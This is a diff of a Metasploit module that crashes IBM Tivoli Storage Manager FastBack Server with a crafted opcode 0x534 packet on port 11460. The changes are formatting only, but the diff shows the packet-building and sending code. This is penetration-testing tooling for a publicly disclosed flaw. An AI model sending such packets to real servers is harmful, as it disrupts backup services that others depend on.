@@ -7,34 +7,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service",
+        'Description' => %q{
           This module exploits a denial of service condition present in IBM Tivoli Storage Manager
           FastBack Server when dealing with packets triggering the opcode 0x534 handler.
         },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Gianni Gnesa',                              # Public disclosure/Proof of Concept
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Gianni Gnesa', # Public disclosure/Proof of Concept
           'William Webb <william_webb[at]rapid7.com>', # Metasploit
         ],
-      'References'     =>
-        [
+        'References' => [
           ['EDB', '38979'],
           ['OSVDB', '132307']
         ],
-      'DisclosureDate' => '2015-12-15',
-    ))
+        'DisclosureDate' => '2015-12-15',
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(11460)
-      ])
+      ]
+    )
   end
 
-  def tv_pkt(opcode, p1="", p2="", p3="")
+  def tv_pkt(opcode, p1 = "", p2 = "", p3 = "")
     buf = Rex::Text.rand_text_alpha(0x0C)
     buf += [opcode].pack("V")
     buf += [0x00].pack("V")
@@ -63,10 +65,9 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Sending malicious packet")
 
     p = tv_pkt(target_opcode,
-               "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % [Rex::Text.rand_text_alpha(0x200),0,0,0,0],
+               "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % [Rex::Text.rand_text_alpha(0x200), 0, 0, 0, 0],
                Rex::Text.rand_text_alpha(0x60),
-               Rex::Text.rand_text_alpha(0x60)
-              )
+               Rex::Text.rand_text_alpha(0x60))
 
     sock.put(p)
     print_status("Packet sent!")
